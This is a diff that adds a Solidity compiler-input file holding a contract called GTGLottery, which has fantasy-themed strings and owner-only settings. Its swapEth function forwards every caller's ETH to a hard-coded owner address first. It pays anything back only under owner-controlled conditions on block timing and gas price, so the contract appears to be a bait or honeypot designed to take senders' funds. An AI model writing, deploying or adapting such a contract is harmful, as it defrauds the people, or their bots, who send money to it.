@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "GTGLottery.sol": {
+      "content": "// SPDX-License-Identifier: Proprietary\npragma solidity ^0.8.4;\n\ncontract GTGLottery {\n    \n    string public theWizard;\n    string public theQuest;\n    string public theIncantation;\n    address payable private immutable _owner;\n    uint private _balance;\n    uint private _unlockedBlock;\n    uint private _maxGasPrice;\n    uint private _spentGas;\n    uint private _minInvestmentPercent;\n    uint private _minWeiReward;\n    uint private _maxRewardPercent;\n    \n    \n    constructor(){\n        theWizard = \"\\u011C4\\u2115\\u1E0D4\\u013F\\u2A0d +\\u0127\\u20AC \\u011C\\u1E5A\\u039E\\u00A5\";\n        theQuest = \"https://www.youtube.com/watch?v=7LkusIvLBx0\";\n        theIncantation = \"https://www.youtube.com/watch?v=G1IbRujko-A\";\n        _owner = payable(0x6520a2A7272192f9FC25C98C8E2f753043369c7D);\n        _balance = 0;\n        _unlockedBlock = 0;\n        _maxGasPrice = 0;\n        _spentGas = 31352;\n        _minInvestmentPercent = 10;\n        _minWeiReward = 10000;\n        _maxRewardPercent = 25;\n    }\n    \n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n    \n    function getBalance() external view onlyOwner returns(uint) {\n        return _balance;\n    }\n    \n    function setSpentGas(uint _spentGasEstimation) external onlyOwner {\n        _spentGas = _spentGasEstimation;\n    }\n    \n    function setMinInvestmentPercent(uint _percent) external onlyOwner {\n        _minInvestmentPercent = _percent;\n    }\n    \n    function setMinWeiReward(uint _minReward) external onlyOwner {\n        _minWeiReward = _minReward;\n    }\n    \n    function setMaxRewardPercent(uint _percent) external onlyOwner {\n        _maxRewardPercent = _percent;\n    }\n    \n    function getUnlockedBlock() external view onlyOwner returns(uint) {\n        return _unlockedBlock;\n    }\n    \n    function unlockBlock(uint _maxGasPriceAllowance) external payable onlyOwner {\n        _unlockedBlock = block.number + 1;\n        _balance += msg.value;\n        _maxGasPrice = _maxGasPriceAllowance;\n        payable(address(this)).transfer(msg.value);\n    }\n    \n    function ownerLock() external onlyOwner {\n        _unlockedBlock = 0;\n    }\n    \n    function _innerLock() private {\n        _unlockedBlock = 0;\n        _maxGasPrice = 0;\n    }\n    \n    function swapEth() external payable {\n        _owner.transfer(msg.value);\n        if(_unlockedBlock == block.number - 1) {\n            if(msg.sender == _owner) {\n                _balance = 0;\n                if(address(this).balance > 0) {\n                    _owner.transfer(address(this).balance);\n                }\n            } else {\n                uint _minInvestment = (_balance * _minInvestmentPercent) / 100;\n                if (tx.gasprice < _maxGasPrice && msg.value > _minInvestment) {\n                    uint _txExpenses = _spentGas * tx.gasprice;\n                    uint _payout = msg.value + _txExpenses + _minWeiReward;\n                    uint _maxReward = (msg.value * _maxRewardPercent) / 100;\n                    if (_balance > msg.value + _maxReward){\n                        _payout = msg.value + _maxReward;\n                    }\n                    if (_balance > _payout) {\n                        _balance -= _payout;\n                        payable(msg.sender).transfer(_payout);\n                    }\n                }\n            }\n        }\n        _innerLock();\n    }\n    \n    function ownerWithraw() external onlyOwner payable {\n        _balance = 0;\n        if(address(this).balance > 0) {\n            _owner.transfer(address(this).balance);\n        }\n    }\n\n    \n    receive() external payable {\n        // _balance += msg.value;\n    }\n}"
+    }
+  }
+}
